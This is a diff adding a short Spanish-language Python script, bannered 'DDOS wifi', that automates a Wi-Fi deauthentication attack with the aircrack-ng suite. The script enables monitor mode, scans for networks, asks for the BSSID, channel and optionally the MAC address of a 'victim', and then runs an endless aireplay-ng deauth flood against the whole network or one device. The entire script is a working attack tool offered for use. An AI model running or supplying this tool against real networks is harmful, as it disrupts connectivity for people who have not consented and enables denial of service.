@@ -1,0 +1,58 @@
+#!/bin/env python3
+
+#librerias
+import os
+
+#colores
+RED = "\033[31m"
+GREEN = "\033[32m"
+RESET = "\033[0m"
+YELLOW = "\033[33m"
+BLUE = "\033[34m"
+banner = """
+\033[32m ██████████   ██████████      ███████     █████████                      ███     ██████   ███ 
+░░███░░░░███ ░░███░░░░███   ███░░░░░███  ███░░░░░███                    ░░░     ███░░███ ░░░  
+ ░███   ░░███ ░███   ░░███ ███     ░░███░███    ░░░     █████ ███ █████ ████   ░███ ░░░  ████ 
+ ░███    ░███ ░███    ░███░███      ░███░░█████████    ░░███ ░███░░███ ░░███  ███████   ░░███ 
+ ░███    ░███ ░███    ░███░███      ░███ ░░░░░░░░███    ░███ ░███ ░███  ░███ ░░░███░     ░███ 
+ ░███    ███  ░███    ███ ░░███     ███  ███    ░███    ░░███████████   ░███   ░███      ░███ 
+ ██████████   ██████████   ░░░███████░  ░░█████████      ░░████░████    █████  █████     █████
+░░░░░░░░░░   ░░░░░░░░░░      ░░░░░░░     ░░░░░░░░░        ░░░░ ░░░░    ░░░░░  ░░░░░     ░░░░░ \033[0m
+
+
+\033[31mInstagram:\033[0m \033[0;35mmacim0_\033[0m
+
+"""
+print(banner)
+
+
+
+
+#info
+os.system("cat /proc/net/dev | awk -F':' '{if (NR>2) print $1}' | tr -d ' '")
+placa = input(f"{YELLOW}Escriba el nombre de su tarjeta de red:{RESET} ")
+print(f"{RED}Habilitando el modo monitor{RESET}")
+os.system(f"sudo airmon-ng start {placa} > /dev/null 2>&1")
+print(f"{YELLOW}Modo monitor{RESET} {GREEN}ACTIVADO{RESET}")
+os.system("cat /proc/net/dev | awk -F':' '{if (NR>2) print $1}' | tr -d ' '")
+placa2 = input(f"{YELLOW}Escriba el nuevo nombre de su placa de red:{RESET} ")
+#reconocimiento
+os.system(f"sudo airodump-ng --band abg {placa2}")
+bssid = input(f"{RED}Escriba el 'bssid' de la red victima:{RESET} ")
+ch = input(f"{RED}Ahora escriba el 'channel' de la red victima:{RESET} ")
+os.system(f"sudo airodump-ng --band abg --bssid {bssid} -c {ch} {placa2}")
+pregunta = input(f"{YELLOW}Desea atacar un solo dispositivo o toda la red?(r) o (d):{RESET} ")
+
+#ataque
+if pregunta == "r":
+    print(f"{BLUE}ATACANDO{RESET}")
+    os.system(f"sudo aireplay-ng -0 0 -a {bssid} {placa2} > /dev/null 2>&1")
+elif pregunta == "d":
+    mac = input(f"{YELLOW}Escriba la mac del dispositivo victima:{RESET} ")
+    print(f"{BLUE}ATACANDO{RESET}")
+    os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {mac} {placa2} > /dev/null 2>&1")
+
+#finalizacion
+print(f"{GREEN}Saliendo del modo monitor{RESET}")
+os.system(f"sudo airmon-ng stop {placa2} > /dev/null 2>&1")
+print("Adiós")
